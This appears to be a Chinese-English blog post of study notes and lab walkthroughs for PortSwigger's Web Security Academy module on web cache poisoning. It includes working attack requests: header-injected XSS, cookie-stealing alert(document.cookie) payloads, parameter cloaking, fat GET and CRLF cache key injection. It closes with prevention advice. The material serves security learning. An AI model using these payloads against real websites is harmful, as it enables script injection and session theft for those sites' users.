---
layout: article
title: WSAcademy 18 -- Web cache poisoning
mathjax: true
key: a00029
cover: /bkgs/1.png
modify_date: 2021-10-20
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- Web cache
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的Web cache poisoning部分<!--more-->

原文：[Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

拓展：

https://portswigger.net/research/practical-web-cache-poisoning

https://portswigger.net/research/web-cache-entanglement

# What is web cache poisoning?

攻击者利用web服务器和缓存的行为，向其他用户提供有害的HTTP响应。

两个阶段：

- 从无意中包含某种危险负载的后端服务器获取响应


- 确保缓存他们的响应，并随后将其送达目标受害者

# How does a web cache work?

**（CDN的一个实现）**

缓存位于服务器和用户之间，通常在固定时间内保存（缓存）对特定请求的响应

![6](/pics/WSA/6.jpg)

## Cache keys

缓存通过比较预定义的请求组件子集（统称为“cache key”）来识别等效的请求。

通常，这将包含请求行和`Host`头

请求中未包含在缓存键中的组件称为“unkeyed”。（**未被检查的输入是缓存忽略的请求的一部分**）

如果传入请求的 cache key与前一个请求的密钥匹配，则缓存认为它们是等效的。

因此，它将提供为原始请求生成的缓存响应的副本。这适用于具有匹配 cache key的所有后续请求，直到缓存响应过期。

关键的是，缓存会**完全忽略请求的其他部分**

# impact of a web cache poisoning

影响取决于两个关键因素：

- **攻击者可以成功缓存哪些内容**

- **受影响页面上的流量**

请注意，缓存项的持续时间不一定会影响web缓存中毒的影响。攻击的脚本通常会无限期地重新毒害缓存。

# Constructing a web cache poisoning attack

一般来说，包括以下步骤：

- 识别和评估未知输入
- 从后端服务器获取有害响应

- 缓存响应

## Identify and evaluate unkeyed inputs

任何web缓存中毒攻击都依赖于对**未知输入（如headers）的操纵**

Web缓存在决定是否向用户提供缓存响应时会忽略未知输入

这意味着您可以使用它们注入有效负载并引发“poisoned”响应

您可以通过向请求中**添加随机输入**并观察它们是否对响应产生影响来手动识别未知输入

然而，有时效果更微妙，需要一些侦查工作才能弄清楚。您可以使用诸如Burp Comparer之类的工具进行比较，以提供一些帮助

### Param Miner

BApp store to adding the [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension

**Caution:** it is important to make sure that your requests all have **a unique cache key so that they will only be served to you**

## Elicit a harmful response from the back-end server

下一步是准确评估网站如何处理它。

如果一个输入在服务器的响应中反映出来，而没有经过适当的清理，或者用于动态生成其他数据，那么这就是web缓存中毒的潜在入口点。

## Get the response cached

操纵输入以引发有害的响应是成功的一半，但除非您能够缓存响应（不好搞），否则效果不会很大。

一旦您确定了如何缓存包含恶意输入的响应，您就可以将该漏洞传递给潜在的受害者。

# Exploiting web cache poisoning vulnerabilities

在某些情况下，web缓存中毒漏洞是由于缓存设计中的一般缺陷造成的

其他时候，特定网站实现缓存的方式可能会带来意想不到的能被利用quirks。

## Exploiting cache design flaws

简言之，如果网站**以不安全的方式处理未知输入并允许缓存后续HTTP响应**，那么它们很容易受到web缓存中毒的影响

### deliver an XSS attack

For example, consider the following request and response:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Crucially for web cache poisoning, **the `X-Forwarded-Host` header is often unkeyed**

xss：

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload

### exploit unsafe handling of resource imports

一些网站使用未命名的标题**动态生成URL以导入资源**，例如外部托管的JavaScript文件

```
lab：
1.change exploit file name to /resources/js/tracking.js ， payload is alert(document.cookie)
2.add X-Forwarded-Host:ac041f131ea729c4809e0a200109006d.web-security-academy.net 
3.send until  the response contains the header X-Cache: hit
```

### exploit cookie-handling vulnerabilities

Cookie通常用于在响应中动态生成内容

一个常见的示例可能是指示用户首选语言的cookie：

```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

假设缓存键不包含`Cookie`头

在这种情况下，如果缓存了对此请求的响应，那么所有试图访问此博客文章的后续用户也将收到波兰语版本，而不管他们实际选择了哪种语言。

however, this vector is relatively **rare** in comparison to header-based cache poisoning

```js
lab：
fehost=someString"-alert(1)-"someString
```

### Using multiple headers to exploit

如上所示，一些网站容易受到简单的web缓存毒害攻击。但是，其他攻击则需要更复杂的攻击，只有当攻击者能够精心设计一个**操纵多个unkeyed的请求时**，才容易受到攻击。

例如，假设一个网站需要使用HTTPS进行安全通信

```http
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

通过将这一点与我们之前了解到的动态生成URL中的漏洞相结合，攻击者可能会利用此行为**生成可缓存响应，从而将用户重定向到恶意URL**

```
lab：
scheme first

X-Forwarded-Scheme:nothttps 
X-Forwarded-Host: acdd1f781ee5a05580c45f54010c00f5.web-security-academy.net
```

scheme ： 
**if you include  HTTPS, you receive a 302 response**

### Exploiting responses that expose too much information

有时网站会泄露太多关于自己和行为的信息，从而使自己更容易受到网络缓存毒害。

#### Cache-control directives

一个这样的例子是，当响应包含有关清除缓存的频率或当前缓存响应的时间的信息时：

```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

尽管这不会直接导致web缓存中毒漏洞，但它确实为潜在的攻击者节省了一些手动操作，因为他们知道**何时发送有效负载以确保缓存**。

#### Vary header

`Vary`头指定了一个附加头的列表，即使这些头通常是未知的，也应将其视为cache key的一部分

例如，It is commonly used to specify that the `User-Agent` header is keyed

只有具有该用户代理的用户才会受到影响或影响最大用户数

```
lab：
Guess headers
X-Host: your-exploit-server-id.web-security-academy.net
comment：
<img src="https://your-exploit-server-id.web-security-academy.net/foo" />
User-Agent：log's 
```

### exploit DOM-based vulnerabilities

许多网站使用JavaScript从后端获取和处理附加数据。如果脚本以不安全的方式处理来自服务器的数据，则可能**导致各种基于DOM的漏洞**。

例如，攻击者可以通过导入包含以下负载的JSON文件的响应毒害缓存：

`{"someProperty" : "<svg onload=alert(1)>"}`

如果使用web缓存中毒使网站从服务器加载恶意JSON数据，则可能需要使用CORS授予网站对JSON的访问权限：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
{
"malicious json" : "malicious json"
}
```

```
lab：
Param Miner ， find X-Forwarded-Host supported
test and find script
add  Access-Control-Allow-Origin: *  to header 
change exploit name and add json data 
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}

If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site
```

### Chaining web cache poisoning vulnerabilities

Web缓存中毒有时需要攻击者将我们讨论过的**几种技术链接在一起**

通过将不同的漏洞链接在一起，通常可以**暴露最初无法利用的其他漏洞层**。

```
		lab：
		Param Miner ， find X-Forwarded-Host  X-Original-URL supported
		tess and find script
		add  Access-Control-Allow-Origin: *  to header 
		change exploit name and add json data 
		{
		  "en": {
		    "name": "English"
		  },
		  "es": {
		    "name": "español",
		    "translations": {
		      "Return to list": "Volver a la lista",
		      "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
		      "Description:": "Descripción"
		    }
		  }
		}

X-Original-URL: /setlang\es  to force other users to the Spanish version of the home page.

Two steps ：
First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.
Second ， while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\es to force all users to the Spanish page.
```

## Exploiting cache implementation flaws

通过操纵典型的unkeyed输入，它只触及了web缓存中毒的表面。

在本节中，您可以通过**利用缓存系统特定实现中的quirks来访问更大的web缓存中毒攻击面**

### Cache key flaws

通过keyed输入注入的任何有效负载都将充当缓存拦截器，这意味着您中毒的缓存条目几乎肯定不会提供给任何其他用户。

实际上，许多网站和CDN在将keyed组件保存在缓存键中时会对其执行各种转换

包括：

- 排除查询字符串


- 过滤掉特定的查询参数


- 规范化keyed部分的输入

### Cache probing methodology

这些较新的技术依赖于缓存的特定实现和配置中的缺陷，这些缺陷可能因站点而异

该方法包括以下步骤：

- 确定合适的缓存oracle


- Probe key 处理


- 识别可利用的gadget

#### Identify a suitable cache oracle

第一步是确定可用于测试的合适“缓存oracle”

**缓存oracle只是提供有关缓存行为的反馈的页面或端点**

这需要是可缓存的，并且必须以某种方式指示您是收到缓存响应还是直接从服务器收到响应



这种反馈可以采取多种形式，例如：

- 一个HTTP头，明确告诉您是否命中缓存

- 动态内容的可观察变化

- 不同的响应时间


如果可以确定正在使用特定的第三方缓存，还可以参考相应的文档

like：

Akamai-based websites may support the header `Pragma: akamai-x-get-cache-key`

```http
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```

#### Probe key handling

下一步是调查在生成 cache key时缓存是否对输入执行任何附加处理,Example：

```http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```

要测试端口是否从cache key中排除，我们首先需要请求一个任意端口，并确保从服务器收到反映此输入的新响应：

```http
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```

Next, we'll send another request, but this time we won't specify a port:

```http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: http s://vulnerable-website.com:1337/en
Cache-Status: hit
```

这证明端口已从cache key中排除

简言之，**although the Host header is keyed**，但缓存转换Host header的方式允许我们将**payload传递到应用程序中，同时仍保留将映射到其他用户请求的“正常”cache key**

#### Identify an exploitable gadget

最后一步是确定一个合适的gadget，您可以将其与此ache key flaw链接

这些gadget通常是典型的客户端漏洞，例如反射的XSS和开放重定向

也许更有趣的是，这些技术使您能够利用许多未分类的漏洞，这些漏洞通常被视为“unexploitable”且未修补。这包括在资源文件中使用动态内容，以及利用浏览器永远不会发送的错误请求进行攻击。

## Exploiting cache key flaws

We'll cover:

- Unkeyed port
- Unkeyed query string 
- Unkeyed query parameters 
- Cache parameter cloaking 
- Normalized cache keys 
- Cache key injection 
- Internal cache poisoning 

### Unkeyed port

`Host`头通常是cache key的一部分，因此，最初似乎不太可能注入任何类型的有效负载。但是，一些缓存系统将解析header并从cache key中排除端口。

只需在请求中添加任意端口，即可构成拒绝服务攻击

如果网站允许您指定非数字端口，则此类攻击可能会进一步升级。例如，您可以使用它来注入XSS负载。

### Unkeyed query string

与`Host`头一样，请求行通常keyed。但是，最常见的cache-key转换之一是排除整个查询字符串。

#### Detecting an unkeyed query string

要识别动态页面，通常会观察更改参数值对响应的影响

幸运的是，有其他方法可以添加cache buster，例如将其添加到**不干扰应用程序行为**的keyed header中。一些典型的例子包括：

```http
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

用Param Miner还可以选择选项“**Add static/dynamic cache buste**”（意味着您将永远不会**hit**）和“Include cache busters in headers”。然后，它会自动将cache buster添加到您发送的任何请求中的常用 keyed headers 中

由于几乎可以保证path是 keyed headers 的，因此有时您可以利用此漏洞发出具有**不同 keys 的请求**，这些键仍然会命中同一端点

例如，以下条目可能全部单独缓存，但被视为与后端上的GET/on等效：

```
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
```

#### Exploiting an unkeyed query string

从缓存密钥中排除查询字符串实际上会使这些反射型XSS漏洞更加严重。

```
lab：
you can use the “ Pragma: x-get-cache-key header ” to display the cache key in the response
you will find that a miss makes your input string shows in the response
```

### Unkeyed query parameters

一些网站仅排除与后端应用程序无关的特定查询参数，例如用于分析或服务目标广告的参数

某些页面以易受攻击的方式处理整个URL，从而可能利用任意参数进行攻击。

```
lab：
（utm_content 广告流量标记的一种）
GET /?utm_content='/><script>alert(1)</script>
```

### Cache parameter cloaking

如果您能够了解缓存如何解析URL以识别和删除不需要的参数，您可能会发现一些有趣的quirks。特别令人感兴趣的是缓存和应用程序之间的任何解析差异。这可能允许您通过在排除的参数中“cloaking”任意参数，从而将它们潜入应用程序逻辑。

For example：

`GET /?example=123?excluded_param=bad-stuff-here`

缓存将标识两个参数，并从cache key中排除第二个参数

但是，服务器不接受第二个？作为分隔符，而只看到一个参数，例如，其**值是查询字符串的整个其余部分，包括payload**

#### Exploiting parameter parsing quirks

在相反的场景中可能会出现类似的参数掩蔽问题，在这种情况下，后端会识别缓存没有识别的不同参数

例如，The **Ruby on Rails** framework, for example, interprets both ampersands (&) and semicolons (;) as delimiters

Example：

`GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here`

Many caches will only interpret this as two parameters, delimited by the ampersand:

1. keyed_param=abc
2. excluded_param=123;keyed_param=bad-stuff-here

On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:

1. keyed_param=abc
2. excluded_param=123
3. keyed_param=bad-stuff-here

If there are duplicate parameters, each with different values, **Ruby on Rails gives precedence to the final occurrence**

```
lab：（To poison the cache you need to send the request when the cache was almost outdated）
Param Miner ： Rails parameter cloaking scan
GET /js/geolocate.js?callback=setCountryCookie

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

#### Exploiting fat GET support

在某些情况下，**HTTP method may not be keyed**

这可能会允许您使用包含恶意负载的**POST**请求毒害缓存。然后，您的负载甚至可以响应用户的GET请求

尽管这种情况非常罕见，但有时您可以通过简单地**向GET请求添加一个body**来创建一个**“fat”GET请求**，从而实现类似的效果：

```http
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here

lab：
GET /js/geolocate.js?callback=setCountryCookie
…

callback=arbitraryFunction
```

这只有在网站接受包含正文的`GET`请求时才可能

有时，您可以通过重写HTTP方法来鼓励“fat GET”处理，例如：(`X-HTTP-Method-Override: POST`)

```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

只要`X-HTTP-Method-Override` header is **unkeyed**，您就可以提交一个伪POST请求，同时保留从请求行派生的GET cache key。

#### Exploiting dynamic content in resource imports

导入的资源文件通常是静态的，但有些文件反映了来自查询字符串的输入

但是，通过将其与web缓存中毒相结合，您可以偶尔将内容注入到资源文件中

For example, consider a page that reflects the current query string in an import statement:

```http
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…

```

You could exploit this behavior to inject malicious CSS that **exfiltrates sensitive information from any pages that import /style.css.**

If the page importing the CSS file doesn't specify a `doctype`, you can maybe even exploit static CSS files

```http
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
```

This request was blocked due to `…alert(1){}*{color:red;}`

### Normalized cache keys

应用于cache key的任何规范化也会引入可利用行为。事实上，它偶尔会启用一些原本几乎不可能的漏洞。

与XSS一样，现代浏览器通常在发送请求时对必要的字符进行URL编码

某些缓存实现在将keyed输入添加到cache key时对其进行规范化。在这种情况下，以下**两个请求将具有相同的key**：

```http
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```

This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities

```http
lab：
GET /random. Notice that the path you requested is reflected in the error message
https://acf01f501e2fb6b780dd11e300ba00bc.web-security-academy.net/qwe</p><script>alert(1)</script>
```

### Cache key injection

有时，您会在keyed header中发现客户端漏洞。这也是一个典型的“unexploitable”问题，有时可以使用缓存投毒加以利用。

如果缓存**未实现组件之间分隔符的正确转义**，则可能会利用此行为创建具有**相同缓存cache key的两个不同请求**。

```
lab:?
/login?lang=en?utm_content=anything
observe  /js/localize.js
Use the Pragma: x-get-cache-key header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL.

GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
```

## Poisoning internal caches

一些网站除了使用独特的外部组件外，还直接在应用程序中实现缓存行为

这些缓存不是缓存整个响应，而是将**响应分解为可重用的片段并分别缓存**。

由于这些缓存片段旨在跨多个不同的响应重用，**因此cache key的概念实际上并不适用**

包含给定片段的每个响应都将重用相同的缓存片段，即使响应的其余部分完全不同

### How to identify internal caches

集成的应用程序级缓存带来的一个挑战是，它们可能**很难识别和调查，因为通常没有面向用户的反馈**

```
lab：
Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key

Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.

1. X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
/js/geolocate.js   alert(document.cookie)
```

### Testing internal caches safely

建议使用**cache buster** （缓存清除器）来防止被投毒响应被提供给其他用户

但是，如果集成缓存 **has no concept of cache keys**，那么传统的缓存buster就没有用处了。这意味着真正的用户很容易无意地缓存投毒。

在发送每个请求之前，请仔细考虑注入的有效负载的影响。特别是，应该**确保只使用您控制的域对缓存进行毒害**，而不是任意的“evil-user.net”。这样，如果出现问题，你就可以控制接下来发生的事情

# How to prevent web cache poisoning vulnerabilities

- 防止web缓存投毒的最终方法**显然是完全禁用缓存**

  例如，如果使用缓存只是因为在采用CDN时默认情况下它是打开的，那么可能需要评估默认缓存选项是否真正反映了业务的需求。

-  即使确实需要使用缓存，将其限制为**纯静态响应**也是有效的

  基于应用安全性仅取决于最弱的一块原则，因此在集成任何第三方技术之前，确保充分了解其安全含义是至关重要的。

- 查看您的CDN支持哪些headers，其中许多标题对于网站的功能是完全不必要的。


- 在实现缓存时，还应采取以下预防措施：

  - 如果出于性能原因考虑**从cache key中排除某些内容**，**请重写请求**。

  - **不接受fat GET请求**。请注意，默认情况下，某些第三方技术可能允许这样做。

  - 修补客户端漏洞，即使它们**看起来无法利用**。由于缓存行为中**不可预知的quirks**，其中一些漏洞实际上可能会被利用。有人发现使此漏洞可被利用的**quirks**（无论是基于缓存还是其他）可能只是时间问题。